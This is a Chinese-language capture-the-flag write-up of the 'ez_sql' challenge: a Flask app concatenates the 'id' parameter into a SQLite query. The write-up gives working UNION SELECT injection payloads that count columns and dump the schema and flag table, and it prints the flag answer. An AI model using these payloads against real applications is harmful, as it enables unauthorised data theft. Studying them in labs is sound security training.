# ez_sql

## 题目简述

Flask 应用从查询参数 `id` 取值，并直接拼接到 SQLite 查询中：

```python
id = request.args.get("id")
sql = "select * from users where id = " + str(id)
result = conn.execute(sql).fetchone()
return render_template("index.html", user=User(*result), sql=sql)
```

注入点位于不带引号的整数上下文。程序会拦截包含 `sqlmap` 的 `User-Agent`，并尝试过滤单双引号，但联合查询所需的 payload 不需要引号。页面将查询结果展开为五字段的 `User` 对象，因此 `UNION SELECT` 也必须返回五列。

## 解题过程

先用 `ORDER BY` 判断原查询列数。当参数为 `1 ORDER BY 6` 时出现错误，而第五列仍可正常返回，因此列数为 5。

SQLite 把表结构保存在 `sqlite_master` 中。令原查询的 `id=-1`，使 `users` 表不返回记录，再将 `sqlite_master.sql` 放到页面实际显示的第五列：

```sql
-1 UNION SELECT 1,2,3,4,sql FROM sqlite_master
```

输出表明存在单列的 `flag(flag)` 表，于是直接查询该列：

```sql
-1 UNION SELECT 1,2,3,4,flag FROM flag
```

仓库中的容器配置可用于核对结果：

```text
0xGame{Do_not_Use_SqlMap!_Try_it_By_Your_Self}
```

## 方法总结

- 核心技巧：整数型 SQLite 联合查询注入，通过 `sqlite_master` 枚举结构后读取目标列。
- 识别信号：用户输入直接拼进 SQL、错误回显可见、结果列数固定时，应优先验证 `ORDER BY` 与 `UNION SELECT`。
- 复用要点：联合查询的列数必须与原查询一致，显示位也要与模板实际使用的字段对应；工具特征和引号过滤都不能修复根本的字符串拼接问题。
